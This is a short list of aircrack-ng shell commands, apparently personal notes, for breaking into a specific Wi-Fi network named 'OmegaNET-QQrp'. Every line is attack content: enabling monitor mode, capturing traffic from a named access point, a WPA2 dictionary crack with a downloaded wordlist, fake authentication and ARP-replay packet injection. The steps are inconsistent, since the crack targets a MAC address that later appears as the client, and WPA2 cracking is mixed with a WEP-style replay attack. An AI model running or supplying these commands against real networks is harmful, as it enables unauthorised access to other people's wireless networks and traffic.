sudo airmon-ng check kill
sudo airmon-ng start wlx54af97d729b2

sudo airodump-ng wlx54af97d729b2

sudo airodump-ng -c 10 --bssid 60:F1:8A:75:FF:5C -w output-file wlx54af97d729b2

sudo aircrack-ng -a2 -b 90:78:41:C0:33:39 -w ~/Downloads/wpa-over200k.txt output*.cap

sudo aireplay-ng --fakeauth 0 -e "OmegaNET-QQrp" -a 60:F1:8A:75:FF:5C wlx54af97d729b2

sudo aireplay-ng --arpreplay -b 60:F1:8A:75:FF:5C -h 90:78:41:C0:33:39 wlx54af97d729b2
